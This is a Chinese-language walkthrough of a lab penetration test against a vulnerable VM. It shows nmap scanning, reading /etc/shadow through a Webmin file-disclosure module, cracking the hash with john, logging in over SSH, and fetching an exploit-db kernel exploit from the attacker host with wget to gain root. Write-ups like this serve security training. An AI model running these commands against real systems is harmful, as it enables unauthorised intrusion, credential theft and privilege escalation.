环境

攻击机IP：192.168.1.10
目标机IP：192.168.1.18

实战

信息收集

使用NMAP扫描端口

nmap -Pn -sV 192.168.1.18


可以看到开放了22-SSH、80-http、10000-http等端口

先看看80端口，浏览一番后发现并没有什么东西，基本上就是有关提示


看一下10000端口，是一个登录界面，尝试了一下万能密码，无法绕过

漏洞发现

在上面的扫描中我们发现1000端口运行的是Webmin程序，看看该程序有没有什么已知漏洞

searchsploit Webmin 0.01

漏洞利用

存在漏洞那么我们就尝试利用漏洞得到一些信息，打开MSF查找webmin


看到auxiliary/admin/webmin/file_disclosure模块与我们在上面所找出来的漏洞相似，加以利用

msf6 > use 1             --利用模块msf6 auxiliary(admin/webmin/file_disclosure) > show options         --查看需要的设置msf6 auxiliary(admin/webmin/file_disclosure) > set rhosts 192.168.1.18    --设置目标IPmsf6 auxiliary(admin/webmin/file_disclosure) > run              --启动模块


可以看到我们获取了目标系统的可用用户名，然后去获取密码

msf6 auxiliary(admin/webmin/file_disclosure) > set rpath /etc/shadowmsf6 auxiliary(admin/webmin/file_disclosure) > run


将得到的密码HASH复制到一个文档中并命名为pass，使用john破解，得到密码h4ckm3

john --wordlist=/usr/share/wordlists/rockyou.txt pass


在前面的扫描中我们看到开放了22-SSH端口，尝试连接

ssh vmware@192.168.1.18

提权

根据目标机器系统版本在kali中找到对应利用文件


将利用文件复制到/var/www/html下

root@kali-xmtx:~/桌面# cd /usr/share/exploitdb/exploits/linux/local/root@kali-xmtx:/usr/share/exploitdb/exploits/linux/local# cp 5092.c /var/www/html/root@kali-xmtx:/usr/share/exploitdb/exploits/linux/local# cd /var/www/html/root@kali-xmtx:/var/www/html# ls


启动apach服务

service apache2 start


在ssh中将5092.c下载到目标机

vmware@ubuntuvm:/$ cd /tmpvmware@ubuntuvm:/tmp$ wget http://192.168.1.10/5092.cvmware@ubuntuvm:/tmp$ ls


编译5092.c并赋权限然后执行

vmware@ubuntuvm:/tmp$ gcc 5092.c -o shellvmware@ubuntuvm:/tmp$ chmod 777 shellvmware@ubuntuvm:/tmp$ ./shell


成功得到root权限
